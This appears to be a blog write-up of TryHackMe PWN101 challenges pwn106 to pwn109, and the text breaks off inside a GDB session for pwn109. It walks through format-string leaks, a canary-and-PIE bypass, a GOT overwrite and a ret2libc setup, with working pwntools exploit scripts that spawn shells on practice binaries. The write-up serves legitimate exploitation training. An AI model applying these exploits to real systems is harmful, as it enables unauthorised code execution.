---
layout: post
title: "[TryHackMe] PWN101 Solutions: pwn106 - pwn110"
date: 2026-04-27
categories: [TryHackMe, PWN101]
---

# {{ page.title }}

## PWN101 Room Brief
```
Prerequisites

Before jumping into this room, there are some prerequisites to complete the challenges:
- C programming language
- Assembly language (basics)
- Some experience in reverse engineering, using debuggers, understanding low-level concepts
- Python scripting and pwntools
- A lot of patience

These are the things you're going to learn in this room:
- Buffer overflow
- Modify variable's value
- Return to win
- Return to shellcode
- Integer Overflow
- Format string exploit
- Bypassing mitigations
- GOT overwrite
- Return to PLT
- Playing with ROP
```

### Previous Post
[Solutions for PWN101: pwn101 - pwn105](/tryhackme/pwn101/TryHackMe-PWN101-Solutions-1-to-5)

---
---
## Challenge Solutions:
- [pwn106 Solution](#pwn106-solution)
- [pwn107 Solution](#pwn107-solution)
- [pwn108 Solution](#pwn108-solution)
- [pwn109 Solution](#pwn109-solution)
- [pwn110 Solution](#pwn110-solution)
- [References](#references)

---
---
## pwn106 Solution
### Disassembly:
```c
void main(void)
{
    int64_t in_FS_OFFSET;
    int64_t var_68h;
    int64_t var_60h;
    int64_t var_58h;
    int64_t var_50h;
    undefined format [56];
    int64_t canary;
    
    canary = *(int64_t *)(in_FS_OFFSET + 0x28);
    setup();
    banner();
    puts(data.00002119);
    printf("Enter your THM username to participate in the giveaway: ");
    read(0, format, 0x32);
    printf("\nThanks ");
    printf(format);
    if (canary != *(int64_t *)(in_FS_OFFSET + 0x28)) {
    // WARNING: Subroutine does not return
        __stack_chk_fail();
    }
    return;
}
```

The `main()` function defines multiple local stack variables as well as a 56 byte buffer. It then prompts the user to enter a username and reads user input before printing *"Thanks"* followed by the input provided by the user.

It uses `printf()` to print the user input, however it does not provide a format specifier (such as: `%s`, `%d`, `%u`...) this means that the user could provide the format specifier within their input which would allow them to leak values from the stack.

Looking at a more detailed disassembly, we can see that the multiple variables defined at the beginning of the function are actually chunks of the flag.

```nasm
0x0000123e      push    rbp
0x0000123f      mov     rbp, rsp
0x00001242      sub     rsp, 0x60
0x00001246      mov     rax, qword fs:[0x28]
0x0000124f      mov     qword [canary], rax
0x00001253      xor     eax, eax
0x00001255      mov     eax, 0
0x0000125a      call    setup      ; sym.setup
0x0000125f      mov     eax, 0
0x00001264      call    banner     ; sym.banner
0x00001269      movabs  rax, 0x5b5858587b4d4854 ; 'THM{XXX['
0x00001273      movabs  rdx, 0x6465725f67616c66 ; 'flag_red'
0x0000127d      mov     qword [var_68h], rax
0x00001281      mov     qword [var_60h], rdx
0x00001285      movabs  rax, 0x58585d6465746361 ; 'acted]XX'
0x0000128f      mov     qword [var_58h], rax
0x00001293      mov     word [var_50h], 0x7d58 ; 'X}'
```

```text
$ ./pwn106-user 
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 107          

🎉 THM Giveaway 🎉

Enter your THM username to participate in the giveaway: %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p

Thanks 0x7ffffe87df60.(nil).(nil).0x8.(nil).0x5b5858587b4d4854.0x6465725f67616c66.0x58585d6465746361.0x7d58.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70
```

Providing the format specifier `%p` allows us to leak leak values from the stack, including what looks like local variable values.

```text
0x5b5858587b4d4854 = THM{XXX[
0x6465725f67616c66 = flag_red
0x58585d6465746361 = acted]XX
0x7d58 = X}

THM{XXX[flag_redacted]XXX}
```
Decoding these values from hexadecimal and swapping the endianness, it reveals the flag.

### Remote Exploitation:
```text
$ nc $IP 9006
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 107          

🎉 THM Giveaway 🎉

Enter your THM username to participate in the giveaway: %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p

Thanks 0x7ffd9b2436e0.(nil).(nil).0x8.0x8.0x5f5530797b4d4854.0x5f3368745f6e3077.0x5961774133766947.0x3168745f446e615f.0x756f595f73315f73.0x7d47346c665f52.0x70252e70252e7025
```

```text
0x5f5530797b4d4854  = THM{y0U_
0x5f3368745f6e3077  = w0n_th3_
0x5961774133766947  = XXXXXXXX
0x3168745f446e615f  = XXXXXXXX
0x756f595f73315f73  = XXXXXXXX
0x7d47346c665f52    = XXXXXX}
```

---
---
## pwn107 Solution
### Disassembly:
#### main()
```c
void main(void)
{
    int64_t in_FS_OFFSET;
    char *format[0x20];
    void *buf;
    int64_t canary;
    
    canary = *(int64_t *)(in_FS_OFFSET + 0x28);
    setup();
    banner();
    puts("You are a good THM player ");
    puts("But yesterday you lost your streak ");
    puts("You mailed about this to THM, and they responsed back with some questions");
    puts("Answer those questions and get your streak back\n");
    printf("THM: What's your last streak? ");
    read(0, &format, 0x14);
    printf("Thanks, Happy hacking!!\nYour current streak: ");
    printf(&format);
    puts("\n\n[Few days latter.... a notification pops up]\n");
    puts("Hi pwner ");
    read(0, &buf, 0x200);
    if (canary != *(int64_t *)(in_FS_OFFSET + 0x28)) {
    // WARNING: Subroutine does not return
        __stack_chk_fail();
    }
    return;
}
```

The `main()` function begins by running the `setup()` function and then the `banner()` function to setup **stdin**, **stdin** and **stdout** as well as printing a banner for the challenge. It prompts the user to enter their last current **TryHackMe** streak. It then prints out the message *"Thanks, Happy hacking!! Your current streak: "* along with the value that the user entered as their streak. However, when printing the value that the user entered, it uses `printf()` with no format specifier which allows the user to provide their own format specifier within their input and leak values from the stack.

It then prints a message saying *"Hi pwner "* and then writes `0x200` (`512`) bytes of user input into the `buf` buffer.

Looking at the raw disassembly of the `main()` function, we can see how the stack is laid out.
```text
Dump of assembler code for function main:
    0x0000000000000992 <+0>:	push   rbp
    0x0000000000000993 <+1>:	mov    rbp,rsp
    0x0000000000000996 <+4>:	sub    rsp,0x40                 <--- Defines a 0x40 (64) byte buffer
    0x000000000000099a <+8>:	mov    rax,QWORD PTR fs:0x28
    0x00000000000009a3 <+17>:	mov    QWORD PTR [rbp-0x8],rax  <--- Writes canary at rbp-0x8
    [REMOVED]
    0x00000000000009fe <+108>:	lea    rax,[rbp-0x40]           <--- The first read() writes to rbp-0x40
    0x0000000000000a02 <+112>:	mov    edx,0x14                 <--- It reads 0x14 (20) bytes into the buffer
    0x0000000000000a07 <+117>:	mov    rsi,rax
    0x0000000000000a0a <+120>:	mov    edi,0x0
    0x0000000000000a0f <+125>:	mov    eax,0x0
    0x0000000000000a14 <+130>:	call   0x750 <read@plt>
    [REMOVED]
    0x0000000000000a53 <+193>:	lea    rax,[rbp-0x20]           <--- The second read() writes to rbp-0x20
    0x0000000000000a57 <+197>:	mov    edx,0x200                <--- It reads 0x200 (512) bytes into the buffer
    0x0000000000000a5c <+202>:	mov    rsi,rax
    0x0000000000000a5f <+205>:	mov    edi,0x0
    0x0000000000000a64 <+210>:	mov    eax,0x0
    0x0000000000000a69 <+215>:	call   0x750 <read@plt>
    0x0000000000000a6e <+220>:	nop
    0x0000000000000a6f <+221>:	mov    rax,QWORD PTR [rbp-0x8]
    0x0000000000000a73 <+225>:	xor    rax,QWORD PTR fs:0x28
    0x0000000000000a7c <+234>:	je     0xa83 <main+241>
    0x0000000000000a7e <+236>:	call   0x720 <__stack_chk_fail@plt>
    0x0000000000000a83 <+241>:	leave
    0x0000000000000a84 <+242>:	ret
```

This means that there is a buffer overflow in the second call to `read()` as it attempts to write `0x200` (`512`) bytes into a `0x20` (`32`) byte buffer. However, the canary is located at `rbp-0x8`, this means that the `buf` buffer is really only 24 bytes large.

##### Stack Layout:
```text
----------------------------
Return Address (rbp+0x8)
----------------------------
Saved RBP (rbp+0x0)
----------------------------
Canary (rbp-0x8) (8 bytes)
----------------------------
buf (rbp-0x20) (24 bytes)
----------------------------
format (rbp-0x40) (32 bytes)
----------------------------
Lower Stack Addresses
----------------------------
```

We can exploit this by sending 24 bytes of junk, followed by the canary value, then another 8 bytes of junk to overwrite the **RBP** and finally the address of where we want to return to.

#### get_streak()
```c
int64_t get_streak (void) {
    int64_t canary;
    rax = *(fs:0x28);
    canary = *(fs:0x28);
    eax = 0;
    puts ("This your last streak back, don't do this mistake again");
    rdi = "/bin/sh";
    system ();
    rax = canary;
    rax ^= *(fs:0x28);
    if (? != ?) {
        stack_chk_fail ();
    }
    return rax;
}
```

There is a function named `get_streak()` which when called will spawn a shell. This function is not called throughout the standard execution of the binary, so this is what I will target when exploiting the buffer overflow.

### Binary Protections (checksec):
```bash
$ checksec ./pwn107
[*] './pwn107'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

The binary has every protection enabled on it. **Full RELRO** means that the **GOT** (**Global Offset Table**) is read-only meaning we could not overwrite any **GOT** entries using the format string vulnerability. The stack has a canary which means that if we overwrite the canary with anything other then itself when exploiting the buffer overflow, the execution of the binary will halt. The **NX** (**Non Executable**) bit is set which means we cannot use shellcode. Finally, the binary is compiled with **PIE** meaning it is position independant so every time the binary is run, the base address of the binary will change therefore altering the locations of the functions (although the function offsets stay the same).

### Exploitation Steps:
- Use the format string vulnerability to leak the stack canary and some stack address which can be used to calculate the PIE base
- Calculate the true address of the `get_streak()` function
- Exploit the buffer overflow to:
    - Overwrite the canary with the leaked value
    - Overwrite the RBP with junk
    - Overwrite the return address with the calculated address of `get_streak()`

#### Fuzzing for the canary and key offsets (fuzzer.py)
```py
#!/usr/bin/env python3

from pwn import *

# Set the binary context to the local binary
context.binary = binary = ELF("./pwn107", checksec=False)
context.log_level = "CRITICAL"

# Get the LIBC used for the binary
libc = binary.libc

gdb_script = """
continue
"""

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(args.HOST or exit("[!] Provide a Remote IP."), int(args.PORT or exit("[!] Provide a Remote Port.")))

    elif args.GDB:
        return gdb.debug([binary.path] + argv, gdbscript=gdb_script, *a, **kw)

    else:
        return process([binary.path] + argv, *a, **kw)

# Exploitation code
for i in range(100):
	# Start connection (LOCAL, REMOTE, or GDB)
	p = start()

	#~~~< Exploit Code Here >~~~#
	payload = f"%{i}$p".encode()
	p.sendlineafter(b"streak? ", payload)

	p.recvuntil(b"current streak: ")
	leaked = p.recvlineS().strip()
	p.close()

	if leaked.endswith("00") and len(leaked) == 18:
		print(f"{i} -> {leaked}\t[POSSIBLE CANARY]")

	for symbol in binary.symbols:
		offset = hex(binary.symbols[symbol])[2:]
		if leaked.endswith(offset):
			print(f"{i} -> {leaked}\t[POSSIBLE '{symbol}' ADDRESS]")
```

```text
1 -> 0x7ffd2d2948e0	        [POSSIBLE 'crtstuff.c' ADDRESS]
1 -> 0x7ffd2d2948e0	        [POSSIBLE 'pwn107.c' ADDRESS]
13 -> 0x21faa31500c17e00	[POSSIBLE CANARY]
13 -> 0x21faa31500c17e00	[POSSIBLE 'crtstuff.c' ADDRESS]
13 -> 0x21faa31500c17e00	[POSSIBLE 'pwn107.c' ADDRESS]
14 -> 0x7ffd3eb66360	        [POSSIBLE 'crtstuff.c' ADDRESS]
14 -> 0x7ffd3eb66360	        [POSSIBLE 'pwn107.c' ADDRESS]
16 -> 0x7f77c27ec000	        [POSSIBLE 'crtstuff.c' ADDRESS]
16 -> 0x7f77c27ec000	        [POSSIBLE 'pwn107.c' ADDRESS]
18 -> 0x192566f10	        [POSSIBLE 'crtstuff.c' ADDRESS]
18 -> 0x192566f10	        [POSSIBLE 'pwn107.c' ADDRESS]
19 -> 0x55b0c6200992	        [POSSIBLE 'main' ADDRESS]
24 -> 0x7f52a4356000	        [POSSIBLE 'crtstuff.c' ADDRESS]
24 -> 0x7f52a4356000	        [POSSIBLE 'pwn107.c' ADDRESS]
28 -> 0x7ffc00000000	        [POSSIBLE 'crtstuff.c' ADDRESS]
28 -> 0x7ffc00000000	        [POSSIBLE 'pwn107.c' ADDRESS]
33 -> 0x699a82ae4704d100	[POSSIBLE CANARY]
33 -> 0x699a82ae4704d100	[POSSIBLE 'crtstuff.c' ADDRESS]
33 -> 0x699a82ae4704d100	[POSSIBLE 'pwn107.c' ADDRESS]
34 -> 0x7ffc82aab730	        [POSSIBLE 'crtstuff.c' ADDRESS]
34 -> 0x7ffc82aab730	        [POSSIBLE 'pwn107.c' ADDRESS]
34 -> 0x7ffc82aab730	        [POSSIBLE 'system' ADDRESS]
34 -> 0x7ffc82aab730	        [POSSIBLE 'plt.system' ADDRESS]
37 -> 0x7f38ffce52f0	        [POSSIBLE 'crtstuff.c' ADDRESS]
37 -> 0x7f38ffce52f0	        [POSSIBLE 'pwn107.c' ADDRESS]
38 -> 0x556c20e00992	        [POSSIBLE 'main' ADDRESS]
39 -> 0x7fd700000000	        [POSSIBLE 'crtstuff.c' ADDRESS]
39 -> 0x7fd700000000	        [POSSIBLE 'pwn107.c' ADDRESS]
42 -> 0x55a6e9c00780	        [POSSIBLE 'crtstuff.c' ADDRESS]
42 -> 0x55a6e9c00780	        [POSSIBLE 'pwn107.c' ADDRESS]
42 -> 0x55a6e9c00780	        [POSSIBLE '_start' ADDRESS]
43 -> 0x7fff85ec46f0	        [POSSIBLE 'crtstuff.c' ADDRESS]
43 -> 0x7fff85ec46f0	        [POSSIBLE 'pwn107.c' ADDRESS]
72 -> 0x7ffe75236390	        [POSSIBLE 'crtstuff.c' ADDRESS]
72 -> 0x7ffe75236390	        [POSSIBLE 'pwn107.c' ADDRESS]
89 -> 0x7ffcbc40bd50	        [POSSIBLE 'crtstuff.c' ADDRESS]
89 -> 0x7ffcbc40bd50	        [POSSIBLE 'pwn107.c' ADDRESS]
```

Running the `fuzzer.py` script multiple times, we can see that the value at the offset `13` is identified as the possible canary every time and the value changes randomly each time which matches the criteria of it being the canary. Also, the value at the offset `19` is identified as the possible address of the `main()` function every time.

Now we have the two values needed to exploit the buffer overflow, we can calculate the **PIE base** by subtracting the fixed offset of the `main()` function from the leaked `main()` address before adding the fixed offset for the `get_streak()` function to get the true runtime address of `get_streak()`.

Attempting to exploit the buffer overflow with the payload `'A'x24 + Canary value + 'A'x8 + get_streak()` will fail with a **Segmentation Fault**. This is due to stack alignment issues which are common on **Ubuntu 20.04** when performing binary exploitation on the system. To solve this, we can add in a simple `ret` gadget to solve the stack alignment issue.

To find the `ret` gadget offset, I used a tool named `ropper`.
```bash
$ ropper -f ./pwn107 --search 'ret'

[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: ret

[INFO] File: ./pwn107
0x00000000000006fe: ret; 
```

The final buffer overflow payload should look like so `'A'x24 + Canary value + 'A'x8 + ret gadget + get_streak()`

### Exploit (pwntools):
```py
#!/usr/bin/env python3

from pwn import *

# Set the binary context to the local binary
context.binary = binary = ELF("./pwn107", checksec=False)
context.log_level = "INFO"

# Get the LIBC used for the binary
libc = binary.libc

gdb_script = """
continue
"""

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(args.HOST or exit("[!] Provide a Remote IP."), int(args.PORT or exit("[!] Provide a Remote Port.")))

    elif args.GDB:
        return gdb.debug([binary.path] + argv, gdbscript=gdb_script, *a, **kw)

    else:
        return process([binary.path] + argv, *a, **kw)

# Exploitation code
offset = 24
buffer = b"A"*offset

ret_gadget = 0x00000000000006fe

# Start connection (LOCAL, REMOTE, or GDB)
p = start()

#~~~< Exploit Code Here >~~~#
p.sendlineafter(b"streak? ", b"%13$p.%19$p")
p.recvuntil(b"current streak: ")
leaked_values = p.recvline().strip()

split_leaked_values = leaked_values.split(b".")
leaked_canary = int(split_leaked_values[0], 16)
leaked_main = int(split_leaked_values[1], 16)

info(f"Leaked Canary Value:\t{hex(leaked_canary)}")
info(f"Leaked main() Address:\t{hex(leaked_main)}")

pie_base = leaked_main - binary.sym['main']
info(f"Calculated PIE Base:\t{hex(pie_base)}")

get_streak_address = pie_base + binary.sym['get_streak']
info(f"get_streak() Address:\t{hex(get_streak_address)}")

buffer += p64(leaked_canary)
buffer += b"BBBBBBBB"
buffer += p64(pie_base + ret_gadget)
buffer += p64(get_streak_address)

p.sendline(buffer)

p.interactive()

# Close connection
p.close()
```

```text
$ python3 exploit.py 
[+] Starting local process './pwn107': pid 16705
[*] Leaked Canary Value:	0xccb5281bab221600
[*] Leaked main() Address:	0x562b7d200992
[*] Calculated PIE Base:	0x562b7d200000
[*] get_streak() Address:	0x562b7d20094c
[*] Switching to interactive mode


[Few days latter.... a notification pops up]

Hi pwner 👾, keep hacking👩‍💻 - We miss you!😢
This your last streak back, don't do this mistake again
$ ls
exploit.py  fuzzer.py  pwn107
```

### Remote Exploitation:
```text
$ python3 exploit.py REMOTE HOST=$IP PORT=9007
[+] Opening connection to XX.XX.XX.XX on port 9007: Done
[*] Leaked Canary Value:	0xb5df293bd1973300
[*] Leaked main() Address:	0x564849c00992
[*] Calculated PIE Base:	0x564849c00000
[*] get_streak() Address:	0x564849c0094c
[*] Switching to interactive mode

[Few days latter.... a notification pops up]

Hi pwner 👾, keep hacking👩‍💻 - We miss you!😢
This your last streak back, don't do this mistake again
$ whoami
pwn107
$ cat flag.txt
THM{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}
```

*(The local offsets for the format string payload may differ from the remote instance offsets. Simply run the fuzzer.py script against the remote instance a few times to locate the correct offsets.)*

---
---
## pwn108 Solution
### Disassembly:
#### main()
```c
void main(void)
{
    int64_t in_FS_OFFSET;
    void *buf;
    char *format;
    int64_t canary;
    
    canary = *(int64_t *)(in_FS_OFFSET + 0x28);
    setup();
    banner();
    puts("      THM University 📚");
    puts(data.00402198);
    printf("\n=[Your name]: ");
    read(0, &buf, 0x12);
    printf("=[Your Reg No]: ");
    read(0, &format, 100);
    puts("\n=[ STUDENT PROFILE ]=");
    printf("Name         : %s", &buf);
    printf("Register no  : ");
    printf(&format);
    printf("Institue     : THM");
    puts("\nBranch       : B.E (Binary Exploitation)\n");
    puts(
        "\n                    =[ EXAM SCHEDULE ]=                  \n --------------------------------------------------------\n|  Date     |           Exam               |    FN/AN    |\n|--------------------------------------------------------\n| 1/2/2022  |  PROGRAMMING IN ASSEMBLY     |     FN      |\n|--------------------------------------------------------\n| 3/2/2022  |  DATA STRUCTURES             |     FN      |\n|--------------------------------------------------------\n| 3/2/2022  |  RETURN ORIENTED PROGRAMMING |     AN      |\n|--------------------------------------------------------\n| 7/2/2022  |  SCRIPTING WITH PYTHON       |     FN      |\n --------------------------------------------------------"
        );
    if (canary != *(int64_t *)(in_FS_OFFSET + 0x28)) {
    // WARNING: Subroutine does not return
        __stack_chk_fail();
    }
    return;
}
```

The `main()` function prompts the user twice for input. The first time it asks for the user's name and uses the `read()` function to read `0x12` (`18`) bytes into the `buf` buffer. The second time, it asks for the user's *registration number* and reads `100` bytes into the `format` buffer.

After receiving input, it prints the user's name and registration number. When printing the name it uses the `%s` format specifier in the call to `printf()` which specifies that it should display the contents of the `buf` buffer as a string. However, when printing the user's *registration number* it does not specify a format specifier, this allows the user to provide format specifiers in their input which could leak values from the stack or write values into memory.

#### holidays()
```c
void holidays(void)
{
    int64_t in_FS_OFFSET;
    undefined4 var_16h;
    undefined2 var_12h;
    int64_t canary;
    
    canary = *(int64_t *)(in_FS_OFFSET + 0x28);
    var_16h = 0x6d617865;
    var_12h = 0x73;
    printf("\nNo more %s for you enjoy your holidays 🎉\nAnd here is a small gift for you\n", &var_16h);
    system("/bin/sh");
    if (canary != *(int64_t *)(in_FS_OFFSET + 0x28)) {
    // WARNING: Subroutine does not return
        __stack_chk_fail();
    }
    return;
}
```

There are only two interesting functions in the binary, the `main()` function and the `holidays()` function which when called will print out a message and spawn a shell. The `holidays()` function is not called throughout the standard execution of the binary.

### Binary Protections (checksec):
```bash
$ checksec ./pwn108
[*] './pwn108'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

The output from `checksec` shows that the binary has a stack canary which is used to help prevent against buffer overflow attacks, however there is a format string vulnerability in this binary so that could be trivial to bypass if there was a buffer overflow vulnerability to exploit. The **NX** (**Non Executable**) bit it set which means we cannot jump to shellcode on the stack. There is no **PIE** (**Position Independant Executable**) which means that every time the binary is run, the addresses of functions will stay the same. Finally, the binary is compiled with only **Partial RELRO** which means it is possible to overwrite the **GOT** entries for externally loaded functions.

### Exploitation:
- Find the offset at which we can control where to write to
- Find a GOT entry which would be useful to overwrite
- Overwrite the GOT entry of a function to point to the `holidays()` function

#### Finding the offset:
```text
$ ./pwn108 
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 108          

      THM University 📚
👨‍🎓 Student login portal 👩‍🎓

=[Your name]: fake
=[Your Reg No]: AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p

=[ STUDENT PROFILE ]=
Name         : fake
Register no  : AAAAAAAA.0x7fff8026ae90.(nil).(nil).0xf.(nil).0xa656b6166.0xc00000.0xc00000.0xc00000.0x4141414141414141
               ^        ^              ^     ^     ^   ^     ^           ^        ^        ^        ^
               INPUT    1              2     3     4   5     6           7        8        9        10
```

Our input `AAAAAAAA` appears at the 10th offset on the stack.

#### Finding a useful GOT entry to overwrite:
```c
printf(&format);
printf("Institue     : THM");
puts("\nBranch       : B.E (Binary Exploitation)\n");
```

Looking at the disassembly, we can see that after the format string vulnerability there is a call to `printf()` and `puts()` which are both externally loaded functions.

```c
printf("\nNo more %s for you enjoy your holidays 🎉\nAnd here is a small gift for you\n", &var_16h);
```

However, within the `holidays()` function there is also a call to `printf()`. If we were to overwrite the **GOT** entry for `printf()` to point to `holidays()` then it would cause an infinite loop of calling `printf()` which would call `holidays()` which would call `printf()` and so on. So instead, we can overwrite the **GOT** entry for `puts()`.

### Exploit (pwntools):
```py
#!/usr/bin/env python3

from pwn import *

# Set the binary context to the local binary
context.binary = binary = ELF("./pwn108", checksec=False)
context.log_level = "CRITICAL"

# Get the LIBC used for the binary
libc = binary.libc

gdb_script = """
continue
"""

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(args.HOST or exit("[!] Provide a Remote IP."), int(args.PORT or exit("[!] Provide a Remote Port.")))

    elif args.GDB:
        return gdb.debug([binary.path] + argv, gdbscript=gdb_script, *a, **kw)

    else:
        return process([binary.path] + argv, *a, **kw)

# Exploitation code
# Start connection (LOCAL, REMOTE, or GDB)
p = start()

#~~~< Exploit Code Here >~~~#
payload = fmtstr_payload(10, {binary.got['puts']: binary.sym['holidays']})

p.sendlineafter(b"name]: ", b"pwn")
p.sendlineafter(b"No]: ", payload)

p.interactive()

# Close connection
p.close()
```

```text
$ python3 exploit.py 

=[ STUDENT PROFILE ]=
Name         : pwn
Register no  :                                                           
Institue     : THM

No more exams for you enjoy your holidays 🎉
And here is a small gift for you
$ ls
exploit.py  pwn108
```

### Remote Exploitation:
```text
$ python3 exploit.py REMOTE HOST=$IP PORT=9008

=[ STUDENT PROFILE ]=
Name         : pwn
Register no  :
Institue     : THM

No more exams for you enjoy your holidays 🎉
And here is a small gift for you
$ whoami
pwn108
$ cat flag.txt
THM{XXXXXXXXXXXXXXXXXXXX}
```

---
---
## pwn109 Solution
### Disassembly:
```c
void main(void)
{
    char *s;
    
    setup();
    banner();
    puts("This time no 🗑️ 🤫 & 🐈🚩.📄 Go ahead 😏");
    gets(&s);
    return;
}
```

In this binary, there are no functions to return to that will spawn us a shell. The `main()` function is very simply, it calls `setup()`, calls `banner()` to print the challenge banner, then calls `gets()` to write user input into a buffer. The `gets()` function has no bounds checking when writing into a buffer, which can lead to a buffer overflow.

### Binary Protections (checksec):
```bash
$ checksec ./pwn109
[*] './pwn109'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

This binary is compiled with **Partial RELRO** which means we could overwrite a **GOT** entry, however as there is no *win* function to call to there isn't much point. This could be useful if we had the specific **LIBC** that the binary is using on the remote instance as we may be able to find a `one_gadget` within the **LIBC** which might allow us to a spawn a shell by simply jumping to the address of the gadget.

There is no canary which makes exploiting a buffer overflow easier but the **NX** (**Non Executable**) bit is set which means we cannot use any shellcode.

Finally, the binary is not position independant which means that functions within the binary will be loaded at the same address every time the binary is run.

### Exploitation:
To exploit this binary, we can perform a `ret2libc` attack. This means that we will overwrite the return address with the address of a function within **LIBC** where it will then call that function. Specifically, we will call the `system()` function which is used to execute system commands. We will also pass the string or the address of the string `/bin/sh` to spawn an interactive shell.

#### Exploitation Steps:
To perform this exploit we need a few things, we will need a `pop rdi; ret;` gadget to be able to pass arguments to function calls. We need a `ret` gadget to account for stack alignment as we know that the remote instance is running **Ubuntu 20.04 LTS**. We also need to figure out what version of **LIBC** the remote instance is using.

##### Finding the gadgets (ropper):
```bash
$ ropper -f ./pwn109 --search "pop rdi"

[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: ./pwn109
0x00000000004012a3: pop rdi; ret;

$ ropper -f ./pwn109 --search "ret"

[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: ret

[INFO] File: ./pwn109
0x000000000040101a: ret; 
```

##### Calculating the LIBC version:
To find the version of **LIBC** being used on the remote instance, we can use a method where we exploit the buffer overflow and build a **ROP** chain to leak the **GOT** entry of functions that we want by calling `puts@PLT` and passing the address of the **GOT** entry for the function. Then we can use the last 3 nibbles of the leaked address (the fixed offset) and use a **LIBC** database like [libc.rip](https://libc.rip/) to calculate which verison of **LIBC** is used.

We first need to find what externally loaded functions are used within the binary, to do this I used **objdump**.

```bash
$ objdump -R ./pwn109 

./pwn109:     file format elf64-x86-64

DYNAMIC RELOCATION RECORDS
OFFSET           TYPE              VALUE
0000000000403ff0 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.5
0000000000403ff8 R_X86_64_GLOB_DAT  __gmon_start__
0000000000404040 R_X86_64_COPY     stdout@GLIBC_2.2.5
0000000000404050 R_X86_64_COPY     stdin@GLIBC_2.2.5
0000000000404060 R_X86_64_COPY     stderr@GLIBC_2.2.5
0000000000404018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
0000000000404020 R_X86_64_JUMP_SLOT  gets@GLIBC_2.2.5
0000000000404028 R_X86_64_JUMP_SLOT  setvbuf@GLIBC_2.2.5
```

There are only 3 **LIBC** functions being used, `puts()`, `gets()`, and `setvbuf()`.

We can write a quick script using **pwntools** to overflow the buffer, overwrite the return address and execute a **ROP** chain to leak the **GOT** entries for these functions.

But first, we need to find the offset at which we begin to overwrite the return address, to do this I used **GDB GEF**.

```text
gef➤  patt cr 200
[+] Generating a pattern of 200 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
[+] Saved as '$_gef0'

gef➤  r
Starting program: ./pwn109 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 109          

This time no 🗑️ 🤫 & 🐈🚩.📄 Go ahead 😏
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffdcb0  →  "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"
$rbx   : 0x0               
$rcx   : 0x00007ffff7f9f7a0  →  0x0000000000000000
$rdx   : 0x00007ffff7f9f7a0  →  0x0000000000000000
$rsp   : 0x00007fffffffdcd8  →  "faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala[...]"
$rbp   : 0x6161616161616165 ("eaaaaaaa"?)
$rsi   : 0x00007ffff7f9d963  →  0xf9f7a0000000000a ("\n"?)
$rdi   : 0x0               
$rip   : 0x0000000000401231  →  <main+003f> ret 
$r8    : 0x0               
$r9    : 0xfbad208b        
$r10   : 0x0               
$r11   : 0x202             
$r12   : 0x00007fffffffddf8  →  0x00007fffffffe163  →  "./pwn109"
$r13   : 0x1               
$r14   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2f0  →  0x0000000000000000
$r15   : 0x0               
